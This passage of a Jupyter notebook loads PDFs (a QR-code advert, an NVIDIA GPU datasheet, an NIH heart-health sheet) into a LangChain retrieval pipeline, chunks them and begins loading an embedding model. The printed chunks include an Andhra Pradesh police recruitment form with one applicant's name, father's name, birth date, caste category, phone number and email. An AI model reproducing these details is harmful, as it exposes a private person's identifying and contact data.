              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 49}, page_content='Creating Innovative and Unique QR Code Solutions\\nis our only job and its what we do better than anyone else.\\nIt isn’t about the code, its about what the code can do for you, and \\nit goes so much further than just a marketing idea.  VitreoQR has a \\ncomplete array of world class solutions, from marketing to \\nmanagement, that can help you measure and grow your business. \\nWhatever your challenge might be, inventory control, counterfeit \\nprevention, access control systems, supply chain management or \\nany one of countless other business conditions, VitreoQR can \\ndevelop a QR Code driven solution to meet your speciÞc needs. As \\na licensee of DENSO Wave QR Code patents, we have all the \\nnecessary tools to make your business more efÞcient and more \\nproÞtable through new ideas in 2D barcoding systems.\\nQRCode QRPhoto QRLogo QRMotion QRAnalytics QRCustom SQRC\\nVitreoQR, LLC\\n12801 Berea Road, Suite F\\nCleveland, Ohio 44111 U.S.A.\\nP. 440.941.2320\\nE. info@vitreoqr.com\\nW. http://vitreoqr.comExplore the possibilities that QR Code technologies offer as real world solutions to even the most \\ndifÞcult problems. Convey information, manage issues, reach new markets and move more \\npeople into your perspective as you have never been able to do before. There simply isnÕt \\nanother technology that can do as much for you, at the same value proposition, as a QR Code. \\nVitreoQR deploys genuine, DENSO Wave QR Codes that are absolutely guaranteed to be fully \\ncompliant with the ISO:18004:2006 speciÞcation, delivering to you security and peace of mind.\\nIn Partnership With\\nQR Code® is a Registered Trademark of DENSO WAVE INCORPORATED.No one understands QR Codes like we do. WARNING: If you donÕt want to learn \\nmore, don’t scan this code!\\nINVENTOR OF\\nTHE QR CODE ®®\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/quadro-rtx-8000-us-nvidia-946977-r1-web.pdf', 'page': 0}, page_content='Quadro rTX 8000  | daTa SheeT | Mar191 NVIDIA NVLink sold separately | 2 Connecting two RTX 8000 cards with NVLink to scale performance and memory capacity to \\n96 GB is only possible if your application supports NVLink technology. Please contact your application provider to confirm their \\nsupport for NVLink | 3 In preparation for the emerging VirtualLink standard, Turing GPUs have implemented hardware support \\naccording to the “VirtualLink Advance Overview”. To learn more about VirtualLink, please see www.virtuallink.org | 4 Via adapter/\\nconnector/bracket | 5 Quadro Sync II card sold separately | 6 Windows 7, 8, 8.1, 10 and Linux | 7 GPU supports DX 12.0 API, \\nHardware Feature Level 12_1 | 8 Product is based on a published Khronos Specification, and is expected to pass the Khronos \\nConformance Testing Process when available. Current conformance status can be found at www.khronos.org/conformance\\n© 2019 NVIDIA Corporation. All rights reserved. NVIDIA, the NVIDIA logo, Quadro, nView, CUDA, and NVIDIA Turing are trademarks \\nand/ or registered trademarks of NVIDIA Corporation in the U.S. and other countries. OpenCL is a trademark of Apple Inc. used \\nunder license to the Khronos Group Inc. All other trademarks and copyrights are the property of their respective owners.reaL TIMe  raY Tra CING  \\nFor ProFeSSIoNaLS\\nExperience unbeatable performance, power, and memory \\nwith the NVIDIA® Quadro RTX™ 8000, the world’s most \\npowerful graphics card for professional workflows. The \\nQuadro RTX 8000 is powered by the NVIDIA Turing™ \\narchitecture and NVIDIA RTX™ platform to deliver the \\nlatest hardware-accelerated ray tracing, deep learning, \\nand advanced shading to professionals. Equipped with \\n4608 NVIDIA CUDA® cores, 576 Tensor cores, and 72 RT \\nCores, the Quadro RTX 8000 can render complex models \\nand scenes with physically accurate shadows, reflections, \\nand refractions to empower users with instant insight. \\nSupport for NVIDIA NVLink™1 lets applications scale \\nperformance, providing 96 GB of GDDR6 memory with \\nmulti-GPU configurations2. And with the industry’s first \\nimplementation of the new VirtualLink®3 port, the Quadro \\nRTX 8000 provides simple connectivity to the next-\\ngeneration of high-resolution VR head-mounted displays \\nto let designers view their work in the most compelling \\nvirtual environments possible.\\nQuadro cards are certified with a broad range of \\nsophisticated professional applications, tested by leading \\nworkstation manufacturers, and backed by a global \\nteam of support specialists. This gives you the peace of \\nmind to focus on doing your best work. Whether you’re \\ndeveloping revolutionary products or telling spectacularly \\nvivid visual stories, Quadro gives you the performance to \\ndo it brilliantly.FEATURES\\n >Four DisplayPort 1.4 \\nConnectors \\n >VirtualLink Connector3 \\n >DisplayPort with Audio \\n >VGA Support4 \\n >3D Stereo Support with \\nStereo Connector4 \\n >NVIDIA GPUDirect™ Support \\n >Quadro Sync II5 Compatibility \\n >NVIDIA nView® Desktop \\nManagement Software \\n >HDCP 2.2 Support \\n >NVIDIA Mosaic6 The W orLd’S FI rST  \\nraY TraCING GP u \\nNVIdIa Quadro r TX 8000 \\nSPECIFICATIONS\\nGPU Memory 48 GB GDDR6\\nMemory Interface 384-bit\\nMemory Bandwidth 672 GB/s\\nECC Yes\\nNVIDIA CUDA Cores 4,608\\nNVIDIA Tensor Cores 576\\nNVIDIA RT Cores 72\\nSingle-Precision \\nPerformance16.3 TFLOPS\\nTensor Performance 130.5 TFLOPS\\nNVIDIA NVLink Connects 2 Quadro  \\nRTX 8000 GPUs1\\nNVIDIA NVLink bandwidth 100 GB/s (bidirectional)\\nSystem Interface PCI Express 3.0 x 16\\nPower Consumption Total board power: 295 W\\nTotal graphics power: 260 W\\nThermal Solution Active\\nForm Factor 4.4” H x 10.5” L,  \\nDual Slot, Full Height\\nDisplay Connectors 4xDP 1.4, VirtualLink (1)\\nMax Simultaneous \\nDisplays4x 3840 x 2160 @ 120 Hz,  \\n4x 5120x2880 @ 60 Hz,  \\n2x 7680x4320 @ 60 Hz\\nEncode / Decode Engines 1X Encode, 1X Decode\\nVR Ready Yes\\nGraphics APIs DirectX 12.07, Shader Model \\n5.17, OpenGL 4.68, Vulkan 1.18\\nCompute APIs CUDA, DirectCompute, \\nOpenCL™To learn more about the NVIDIA Quadro RTX 8000 visit www.nvidia.com/quadro'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Bio/quadro-rtx-8000-us-nvidia-946977-r1-web.pdf', 'page': 0}, page_content='Quadro rTX 8000  | daTa SheeT | Mar191 NVIDIA NVLink sold separately | 2 Connecting two RTX 8000 cards with NVLink to scale performance and memory capacity to \\n96 GB is only possible if your application supports NVLink technology. Please contact your application provider to confirm their \\nsupport for NVLink | 3 In preparation for the emerging VirtualLink standard, Turing GPUs have implemented hardware support \\naccording to the “VirtualLink Advance Overview”. To learn more about VirtualLink, please see www.virtuallink.org | 4 Via adapter/\\nconnector/bracket | 5 Quadro Sync II card sold separately | 6 Windows 7, 8, 8.1, 10 and Linux | 7 GPU supports DX 12.0 API, \\nHardware Feature Level 12_1 | 8 Product is based on a published Khronos Specification, and is expected to pass the Khronos \\nConformance Testing Process when available. Current conformance status can be found at www.khronos.org/conformance\\n© 2019 NVIDIA Corporation. All rights reserved. NVIDIA, the NVIDIA logo, Quadro, nView, CUDA, and NVIDIA Turing are trademarks \\nand/ or registered trademarks of NVIDIA Corporation in the U.S. and other countries. OpenCL is a trademark of Apple Inc. used \\nunder license to the Khronos Group Inc. All other trademarks and copyrights are the property of their respective owners.reaL TIMe  raY Tra CING  \\nFor ProFeSSIoNaLS\\nExperience unbeatable performance, power, and memory \\nwith the NVIDIA® Quadro RTX™ 8000, the world’s most \\npowerful graphics card for professional workflows. The \\nQuadro RTX 8000 is powered by the NVIDIA Turing™ \\narchitecture and NVIDIA RTX™ platform to deliver the \\nlatest hardware-accelerated ray tracing, deep learning, \\nand advanced shading to professionals. Equipped with \\n4608 NVIDIA CUDA® cores, 576 Tensor cores, and 72 RT \\nCores, the Quadro RTX 8000 can render complex models \\nand scenes with physically accurate shadows, reflections, \\nand refractions to empower users with instant insight. \\nSupport for NVIDIA NVLink™1 lets applications scale \\nperformance, providing 96 GB of GDDR6 memory with \\nmulti-GPU configurations2. And with the industry’s first \\nimplementation of the new VirtualLink®3 port, the Quadro \\nRTX 8000 provides simple connectivity to the next-\\ngeneration of high-resolution VR head-mounted displays \\nto let designers view their work in the most compelling \\nvirtual environments possible.\\nQuadro cards are certified with a broad range of \\nsophisticated professional applications, tested by leading \\nworkstation manufacturers, and backed by a global \\nteam of support specialists. This gives you the peace of \\nmind to focus on doing your best work. Whether you’re \\ndeveloping revolutionary products or telling spectacularly \\nvivid visual stories, Quadro gives you the performance to \\ndo it brilliantly.FEATURES\\n >Four DisplayPort 1.4 \\nConnectors \\n >VirtualLink Connector3 \\n >DisplayPort with Audio \\n >VGA Support4 \\n >3D Stereo Support with \\nStereo Connector4 \\n >NVIDIA GPUDirect™ Support \\n >Quadro Sync II5 Compatibility \\n >NVIDIA nView® Desktop \\nManagement Software \\n >HDCP 2.2 Support \\n >NVIDIA Mosaic6 The W orLd’S FI rST  \\nraY TraCING GP u \\nNVIdIa Quadro r TX 8000 \\nSPECIFICATIONS\\nGPU Memory 48 GB GDDR6\\nMemory Interface 384-bit\\nMemory Bandwidth 672 GB/s\\nECC Yes\\nNVIDIA CUDA Cores 4,608\\nNVIDIA Tensor Cores 576\\nNVIDIA RT Cores 72\\nSingle-Precision \\nPerformance16.3 TFLOPS\\nTensor Performance 130.5 TFLOPS\\nNVIDIA NVLink Connects 2 Quadro  \\nRTX 8000 GPUs1\\nNVIDIA NVLink bandwidth 100 GB/s (bidirectional)\\nSystem Interface PCI Express 3.0 x 16\\nPower Consumption Total board power: 295 W\\nTotal graphics power: 260 W\\nThermal Solution Active\\nForm Factor 4.4” H x 10.5” L,  \\nDual Slot, Full Height\\nDisplay Connectors 4xDP 1.4, VirtualLink (1)\\nMax Simultaneous \\nDisplays4x 3840 x 2160 @ 120 Hz,  \\n4x 5120x2880 @ 60 Hz,  \\n2x 7680x4320 @ 60 Hz\\nEncode / Decode Engines 1X Encode, 1X Decode\\nVR Ready Yes\\nGraphics APIs DirectX 12.07, Shader Model \\n5.17, OpenGL 4.68, Vulkan 1.18\\nCompute APIs CUDA, DirectCompute, \\nOpenCL™To learn more about the NVIDIA Quadro RTX 8000 visit www.nvidia.com/quadro'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Bio/06-5715.pdf', 'page': 0}, page_content='If you’re like most people, you may think of heart \\ndisease as a problem for other folks. If you’re a \\nwoman, you may believe that being female protects you from heart disease. \\nIf you’re a man, you may \\nbelieve you’re not old enough to have a serious heart condition. Wrong on all counts. \\nHeart disease is the #1 killer in the United States—of both men and women. \\nIt affects many people at midlife \\nas well as in old age. African Americans and Latinos are at especially high risk for heart disease and have high rates of some of the risk factors that lead to heart disease. \\nThe good news is that heart disease is preventable. \\nY\\nou can take action to reduce your risk of heart \\ndisease by focusing on your lifestyle and habits. This fact sheet gives you steps you can take to protect your heart health. And what’s good for you, is good for your whole family. As an adult, you can make lifestyle changes that can set a good example for children who may have already developed habits that can lead to heart disease. \\nWhat Is Heart Disease? \\nCoronary heart disease—often simply called heart disease—occurs when the arteries that supply blood to the heart muscle become hardened and narrowed due to a buildup of plaque on the inner walls of the arteries. A heart attack occurs when the plaque in an artery bursts and a clot forms over the plaque, blocking flow through the artery and preventing oxygen and nutrients from getting to the heart. Heart disease is a lifelong condition. Once you get it, you’ll always have it. \\nBut there is much you can do to \\ncontrol the risk factors for heart disease, prevent a heart attack, and increase your chances for a long and vital life. \\nRisk Factors \\nRisk factors are health conditions or habits that increase the chances of developing a disease or having it worsen. For heart disease, there are some risk factors that you can’t change, but many that you can. You can’t change a family history of early heart disease or your age, which for women becomes a risk factor at age 55. Men are at higher risk beginning at age 45. \\nEvery risk factor counts, and if you have more than \\none, they can “gang up” and worsen each other’\\ns \\neffects. But most risk factors can be controlled with changes in lifestyle. Sometimes medication is also needed. Here’s a quick review of these risk factors. \\nSmoking. Smoking leads to reduced blood flow in the \\narteries. \\nThis reduced flow can lead to a heart attack. \\nThere’s no safe way to smoke. However, the benefits of \\nquitting start immediately. After a few days, your blood pressure will drop and the levels of oxygen and carbon monoxide in the blood can return to normal. Just 1 year after quitting, your heart disease risk will drop by more than half. It’s not easy to quit, but make a plan and you can do it. Or try an organized program or medication—ask your doctor if either is right for you. \\nHigh blood pressure. Also called hypertension, high \\nblood pressure increases your risk of heart disease, stroke, and congestive heart failure. \\nEven levels slightly \\nabove normal—called prehypertension—increase your heart disease risk. \\nA Healthy Heart IN BRIEF: \\nYour Guide to \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Bio/06-5715.pdf', 'page': 1}, page_content='There are several ways to get your blood pressure under \\ncontrol. Follow a heart healthy eating plan, r educe \\nyour salt and sodium intake, get regular physical activity, \\nand maintain a healthy weight. If you drink alcoholic \\nbeverages, do so in moderation—one drink per day for \\nwomen and two per day for men. Your doctor may also \\nrecommend medication to lower your blood pressure. \\nHigh blood cholesterol. Excess cholesterol and fat in your \\nblood build up in the walls of the vessels that supply \\nblood to the heart. \\nThis buildup, called plaque, can lead \\nto blockages. A lipoprotein profile tests your levels of \\ntotal cholesterol, low-density lipoprotein (LDL) or “bad” \\ncholesterol, high-density lipoprotein (HDL) or “good” \\ncholesterol, and triglycerides—a fatty substance in the blood. \\nYou can lower your cholesterol by following a heart \\nhealthy eating plan, being physically active, maintaining \\na healthy weight, and, if needed, taking medication. \\nOverweight/obesity. The high rate of overweight and \\nobesity in our country is no secret. \\nBut size isn’t the \\nonly issue. Excess weight can increase the risk of not \\nonly heart disease, but a host of other conditions, such \\nas stroke, gallbladder disease, arthritis, and some can -\\ncers. Even a small amount of weight loss (10 percent of \\nyour initial weight) will help lower your heart disease \\nrisk. \\nIf you are overweight, at the very least, try not to \\ngain more weight. Lasting weight loss requires a change in lifestyle. Adopt \\na healthy\\n, lower calorie eating plan, and be more \\nphysically active. Aim to lose no more than 1/2 pound \\nto 2 pounds per week. If you have a lot of weight to \\nlose, ask your doctor, a registered dietitian, or a \\nqualified nutritionist to help. \\nPhysical inactivity. Even if you have no other risk \\nfactors, being physically inactive greatly boosts your \\nchances of developing heart-related problems. \\nBut \\nnearly 40 percent of Americans do no spare-time \\nphysical activity at all. \\nTry to do at least 30 minutes of moderate-intensity \\nphysical activity on most, if not all, days of the week. \\nThis includes brisk walking, light weightlifting, or even \\nhousecleaning or gardening. \\nIf you need to, divide the 30 \\nminutes into shorter periods of at least 10 minutes each. \\nDiabetes. About 11 million Americans have been \\ndiagnosed with diabetes—and another 5.7 million don’\\nt \\nknow they have it. About two-thirds of those with \\ndiabetes die of heart or blood vessel disease. \\nDiabetes can be detected with a blood sugar test. If you \\nhave diabetes, it is vital that you keep it under control. \\nModest changes in diet and level of physical activity \\ncan often prevent or delay the development of diabetes. \\nTaking Action \\nThe first step to improving your heart health is learning \\nabout your risk profile. See the box “Questions To Ask \\nYour Doctor.” Then begin taking the steps to heart \\nhealth—don’t smoke, follow a heart healthy eating \\nplan, be physically active, and maintain a healthy \\nweight. Start today to keep your heart strong. \\nTo Learn More \\nContact the National Heart, Lung, and Blood Institute \\n(NHLBI) for information and publications on heart \\ndisease and heart health. \\nNHLBI Health Information Center \\nP.O. Box 30105 \\nBethesda, MD 20824-0105 \\nPhone: 301–592–8573 \\nTTY: 240–629–3255 \\nFax: 301–592–8563 \\nwww.nhlbi.nih.gov 1. What is my risk for heart disease? \\n2. What is my blood pressure? What does it mean \\nfor me and what do I need to do about it?\\n \\n3. What are my cholesterol numbers? (These include  \\ntotal cholesterol, LDL, HDL, and triglycerides— \\na type of fat found in the blood and food.) What \\ndo they mean for me and what do I need to do \\nabout them? \\n4. What are my body mass index (BMI) and waist \\nmeasur\\nement? Do they mean that I need to lose \\nweight for my health? \\n5. What is my blood sugar level, and does it mean \\nthat I’m at risk for diabetes?\\n If so, what do \\nI need to do about it? \\n6. What other screening tests do I need to help \\npr\\notect my heart? \\n7. What can you do to help me quit smoking? \\n8. How much physical activity do I need to help \\npr\\notect my heart? \\n9. What’s a heart healthy eating plan for me? \\nHow can I tell if I’m having a heart attack? If I \\nthink I’m having one, what should I do?\\n Questions To Ask \\nYour Doctor \\n10. \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\nNIH Publication No. 06–5715 \\n')]"
            ]
          },
          "metadata": {},
          "execution_count": 9
        }
      ],
      "source": [
        "docs"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_A2nX3-Ptgl"
      },
      "source": [
        "## Text Splitting - Chunking"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Bouw0M5ANVqL"
      },
      "outputs": [],
      "source": [
        "text_splitter = RecursiveCharacterTextSplitter(chunk_size=300, chunk_overlap=50)\n",
        "chunks = text_splitter.split_documents(docs)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TfDphk1rrM0A",
        "outputId": "34736df0-7c6c-4bb3-9647-e9ae77248238"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1552"
            ]
          },
          "metadata": {},
          "execution_count": 11
        }
      ],
      "source": [
        "len(chunks)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Fsc6K_Z3NnhT",
        "outputId": "11a60a0d-8808-495c-8542-f3bc5f14aada"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 0}, page_content='STATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH,\\nMANGALAGIRI.\\n  \\nFILLED IN ONLINE APPLICATION FORM\\n  \\nFor the posts of SCT PCs (Civil) (Men & Women),  \\n  \\nSCT PCs (APSP) (Men) in Police Dept.\\n  \\n  Vide Notification Rc.No.161/SLPRB/Rect.2/2022, dt: 28.11.2022.\\nBasic Details\\nRegistration No.')"
            ]
          },
          "metadata": {},
          "execution_count": 12
        }
      ],
      "source": [
        "chunks[0]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "jenEDd6hN7Cn",
        "outputId": "cecf60f4-aef6-45d9-c8c9-63a295414c0b"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 0}, page_content=\"Basic Details\\nRegistration No.\\n4159216\\n1. Name of the Candidate\\n  \\n(as per SSC or Equivalent Certificate)\\nSUNNAM SEETHARAM\\n2. Father's/ Husband's Name\\nS VEERRAJU\\n3. Gender\\nMale\\n4. Date of Birth\\n  \\n(as per SSC or Equivalent certificate)\\n16-Aug-1996\\n5. SSC/Equivalent Roll No\\n1111127157\\n6. Community\")"
            ]
          },
          "metadata": {},
          "execution_count": 13
        }
      ],
      "source": [
        "chunks[1]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xLh3j6guOTLY",
        "outputId": "2d351b48-8874-4c60-e644-6461aec8c492"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 0}, page_content='5. SSC/Equivalent Roll No\\n1111127157\\n6. Community\\nABO-ST\\n7. Mobile No.\\n8688655324\\n8. e-Mail Id\\nbtgsuryacomputers@gmail.com\\nAge Relaxation Details\\n9. As per the information you provided in Column Nos. 9 & 10 in Online Application Form (Stage 1), do you \\ncome under the Reservation Quota?\\nABO-ST')"
            ]
          },
          "metadata": {},
          "execution_count": 14
        }
      ],
      "source": [
        "chunks[2]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "B-lh4cUSO5EH",
        "outputId": "73a9126a-170c-40b0-9bbd-a6fccc451f41"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 0}, page_content='come under the Reservation Quota?\\nABO-ST\\na) Do You come under Creamylayer or Non-Creamylayer\\nNA\\nb) Sub Caste(BC-E Candidates)\\nNA\\n10. Do you claim benefit of Physical Measurements and age Relaxtion under category of ABO-ST? (Please \\ngo through the Notification)\\nYes\\nWhat is your Native Scheduled Area')"
            ]
          },
          "metadata": {},
          "execution_count": 15
        }
      ],
      "source": [
        "chunks[3]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_eZw3iXPPlGs",
        "outputId": "446c809b-1a51-4e6d-dda0-559e1d3da6f4"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 0}, page_content='Yes\\nWhat is your Native Scheduled Area\\nButtaygudem (Wholly)\\n11. Do you claim age relaxation under category Employee of the A.P. Government? (Please go through the \\nNotification)\\nNo\\ni) Date of Joining in Service\\nNA\\nii) Length of Service as on 28.11.2022\\nNA\\niii) Are you still in Service\\nNA')"
            ]
          },
          "metadata": {},
          "execution_count": 16
        }
      ],
      "source": [
        "chunks[4]"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wxL78Mn0P3N2"
      },
      "source": [
        "## Embeddings"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 458,
          "referenced_widgets": [
            "03c8bc2e4a9e49c3ad2b48a4e1d884c5",
            "8ade15db445b4ce4bc677bdfae66f502",
            "d0569628774e45f7a535001f0d7e06d2",
            "14569b5374b840d4adf3e838a9603cdc",
            "b7de15d0c0a8445c8cc68c90e5d49412",
            "f029673f3acc4ed58b63a06ab6218bcb",
            "421127846fa14aac8f366ba19c766560",
            "d2593f17e09145b5ab5083487e0a750c",
            "e8f2ce95092d47f296448e680a1bd90c",
            "8382940ef2324b16bdb9076947956201",
            "fae80d2a358846ff97e8649e90b8061d",
            "5c91f47bdf614832a7cf5e167628647a",
            "7130b281873f4090a78160d671b6ffee",
            "dc786198a6ce42d7b9e4f367175c771c",
            "58f067c4351e41179c6332357612dc3d",
            "a3a75168199f4be080003b0b844b1d2d",
            "a96ef8a385074304bbec4da2e6b61b39",
            "e5d622e1e1354cd89396bbfe3210a3f6",
            "7dc0b76926214d4180ebe2e7db394caf",
            "fa55b6d11ddf4e5482f5a85ad90b11a1",
            "07220c3f8b114ef8bbe2e11436256139",
            "a1e79d903b22465cabe65e824d92b892",
            "d9d8b69918cd4f0297944ea8ea0b2946",
            "180d8b88bb654439810cbb33fe4dd104",
            "b9dee105f2af47a399a39e80cece4d11",
            "4e94efafcbf74ad08f685c0bf2b3142e",
            "9815828d68484592841c4eb2a927a0b5",
            "5362fabf662a423eb078d8cb6d2ce8c1",
            "facc8b4c23ea45108b59b9b041321b8e",
            "c8c25f340a854a68b2bd0514880bac4c",
            "d15ce1ef502b44a2986098ec64792a80",
            "a1deeee40bdd405baf588adec30faf8f",
            "fcc5c616f0da472280284cb05eaacba6",
            "92970536beea48caa835f1dfe25be81b",
            "66f3bc31775d47d99c9f02ab2b7740fb",
            "9f225b2f3438494aabd54d1503bbf683",
            "56f8cedbfb8f4c5391519873fa84ff8b",
            "74f2c76e35d2481fa52f0766250fe272",
            "dde4d262763e4c00ab2b8110d9f1b4b1",
            "4c256fbbc43e4f1f9de0cc880c343789",
            "abbce8ee7e01441a8e7bc26f29924e00",
            "0f785530d7b34f94a5d5c4641e13663d",
            "e69c66f613b841868cca4e25eaa33c37",
            "77b0988af1134d0d9d91e7053a71dd9a",
            "68b03f4c4537460d8610680943e9cbd1",
            "c9a81fff07694e6fb2f60a3ae917f2d8",
            "1ee5aa38178e49339184cd9327e5da95",
            "9d755b37111141a6bf9d348770ad1fd8",
            "aab3ec4dd15c40e9b7497289c9a823d5",
            "34d92dd1178b4a4389e404c729577d23",
            "020fc470782d438d8f9ffba56247773f",
            "7c80b97a9ed44709b16da8fb84fffc53",
            "877f54140a66466ab5cee9971458c262",
            "3cb21a7c3bca4c8da105033ef5432580",
            "9e63621b4eab4bb08603cd647777b07f",
            "ae7418b1f6634882b73fb83727368400",
            "968b9ad403284785ac46510c90235066",
            "845b4b11e7b242988159f300c926c460",
            "b05e7bef3ad24fc79cd964a7f9129b6d",
            "9407d8684e034df5b1f256ef205760dd",
            "569886d4109c4fc8baa5a6fe803fa1af",
            "6146ace14f0a4c04a4aaece59728f233",
            "7259b2b93a0e4dbc81fec5d16ce818b9",
            "4148f642eb0f47a4ace364b1fe9f7fb6",
            "db3eba9b0587413595bb926ebb02290d",
            "4f7c077ccd1d4b0c9c74f9fc3c3e9f5d",
            "c883f23b659e46aa9eacac0140aeb013",
            "c64d0067541642d088765c865ad5628b",
            "456fd659df504e9b902bd60da7c90e5c",
            "accca9c1ad9a443c8638039996b2505c",
            "1829482d752e4e31a26c82f67127a28b",
            "7541c37691374dc3b5a578109e8d8c42",
            "41e5eaacb312466baf175178c90367cd",
            "be4cbbe0bc734711b883f96cd2b76770",
            "2ed348a564054f18a7b0b6cd2f9e424e",
            "fe3f2792ad9e4cb6ae57879c0c4e4805",
            "e02a7b88a3f94aa2833f87877ff421b9",
            "7b4b4db9e2534d51a13f12eb106c4124",
            "a94da1f4e8074d0ea0e5cbe0622b0a79",
            "c0d1962141304b4aa7110396cca2a0a1",
            "22c3a43d08c84bcfbf82cf4f1fb53770",
            "250add9680bd43eea9028a4b6e7cf72d",
            "ebace4219de24d05b97991650d961ea8",
            "466839ad260241b9bf52d3597a860f6f",
            "8669408f9517432a86d4e170dc838b15",
            "1287557c8db9427595285e7644775cf8",
            "15ea4e1658524575b23d6d1e9eaa5349",
            "0c8d2ccac6414bfb9159b20fa1195022",
            "d7f8c12895884723b95ae1e35a87ebd3",
            "8057edbebafb4c63b0a59c3ee285305a",
            "0b4ff7e5ae1e40b48868799aa5bfdfcf",
            "5f669c5ae045451493684c2f2ffa7a28",
            "86fe0bd349be44f8a5fc51756c60a11b",
            "447b2870af794d1eb4a24891bc5c622a",
            "fb77a09a32b74857ba2be8cdbe0dae7b",
            "0d363901eb394a54a403f7a0474d21d5",
            "bc3e68b46c1d4508b37f36cfb5d09b92",
            "18fd0cd029364379b5db801c997092cf",
            "84c064a653f84c8688a4bff8e06bf206",
            "c67c0489ef294a669b448a3988ef7976",
            "ce8860ec051d448ba64c4a845a419e43",
            "da43f32381d846fb958f191f25bfe20e",
            "76f3e26fd6c9445e96fb0eceac983174",
            "faa303c4d02c4c0eabc19a1c351d8683",
            "937d7f9807234292b743e48cff16fa04",
            "a5950174b89243e59403074011337135",
            "21d2a6b8cdc04bd9a59e756982dc3858",
            "6e5378c380ac448aa8adcd41e48eb1c3",
            "94234135a607416aa7061e6011dda43a",
            "9ceb225a99d94aa4b942a4b4485ec571",
            "545fe363b08942c2adf1b118421d3d3c",
            "20490fa095eb47b9a8cd96d8ecf700eb",
            "0ed194f21ddf4c08879a8787bc16b6e2",
            "9294b5aa90cd423c9ae9efdfb9550771",
            "4ae7718af274444a8dfd167dfafeed44",
            "9b93818a9d044ddfbed5ae23ee755d44",
            "c11699a45f84428f90172a6618bf685a",
            "cd611e02563946ed93f1d50c738f70de",
            "16981fbcfa914cf895b306a3d49afa9f",
            "885d9e676c464f248bb10d9c3ffa724d",
            "0a2d956764e44eb3a827c71b52a5daeb"
          ]
        },
        "id": "QcUdFP8cPz1L",
        "outputId": "fd76dc85-0596-49c5-9f15-94eee97c249f"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-17-e470369191f5>:1: LangChainDeprecationWarning: The class `HuggingFaceEmbeddings` was deprecated in LangChain 0.2.2 and will be removed in 1.0. An updated version of the class exists in the langchain-huggingface package and should be used instead. To use it run `pip install -U langchain-huggingface` and import as `from langchain_huggingface import HuggingFaceEmbeddings`.\n",
            "  embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")\n",
            "/usr/local/lib/python3.10/dist-packages/sentence_transformers/cross_encoder/CrossEncoder.py:11: TqdmExperimentalWarning: Using `tqdm.autonotebook.tqdm` in notebook mode. Use `tqdm.tqdm` instead to force console mode (e.g. in jupyter console)\n",
            "  from tqdm.autonotebook import tqdm, trange\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "modules.json:   0%|          | 0.00/349 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "03c8bc2e4a9e49c3ad2b48a4e1d884c5"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config_sentence_transformers.json:   0%|          | 0.00/124 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "5c91f47bdf614832a7cf5e167628647a"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "README.md:   0%|          | 0.00/94.6k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "d9d8b69918cd4f0297944ea8ea0b2946"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "sentence_bert_config.json:   0%|          | 0.00/52.0 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
